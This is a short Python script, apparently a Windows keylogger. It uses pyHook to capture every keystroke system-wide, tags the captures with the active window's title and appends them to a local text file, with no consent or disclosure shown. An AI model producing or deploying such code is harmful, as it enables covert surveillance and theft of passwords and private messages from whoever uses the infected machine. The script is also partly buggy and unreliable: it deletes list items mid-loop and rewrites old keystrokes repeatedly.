import pyHook
import pythoncom

keys = []
current_window = None

def on_keyboard_event(event):
    # print('MessageName:', event.MessageName)
    # print('Message:', event.Message)
    # print('Time:', event.Time)
    # print('Window:', event.Window)
    # print('WindowName:', event.WindowName)
    # print('Ascii:', event.Ascii, chr(event.Ascii))
    # print('Key:', event.Key)
    # print('KeyID:', event.KeyID)
    # print('ScanCode:', event.ScanCode)
    # print('Extended:', event.Extended)
    # print('Injected:', event.Injected)
    # print('Alt', event.Alt)
    # print('Transition', event.Transition)
    # print('---')
    global current_window
    # print(event.Key)
    if current_window != event.Window and len(keys) > 0:
        current_window = event.Window
        keys.extend([' ------ ', event.WindowName, '\n', '\n'])
        process_keys()

    if event.Key != 'Back':
        add_to_list(event.Key)


# return True to pass the event to other handlers
    return True


# add key to list of keys
def add_to_list(key):
    keys.append(key.lower())


# process the keys that are shifted, deleted, etc.
def process_keys():
    caps = False
    for i, key in enumerate(keys):
        if i <= 0 or i >= len(keys):
            continue
        if caps:
            keys[i] = key.upper()

        if key == 'capital':
            if caps:
                caps = False
            else:
                caps = True

        if key == 'tab':
            keys[i] = '\t'

        if key == 'lshift':
            keys[i+1] = keys[i+1].upper()
            del keys[i]

        if key == 'space':
            keys[i] = ' '

        if key == 'return':
            keys[i] = '\n'

    # Write to file
    with open('file.txt', 'a') as f:
        f.write(''.join(keys))

# Create a Hook Manager
h_m = pyHook.HookManager()
# watch for all keyboard events
h_m.SubscribeKeyDown(on_keyboard_event)
# start watching for keyboard inputYyY
h_m.HookKeyboard()
# wait forever
pythoncom.PumpMessages()
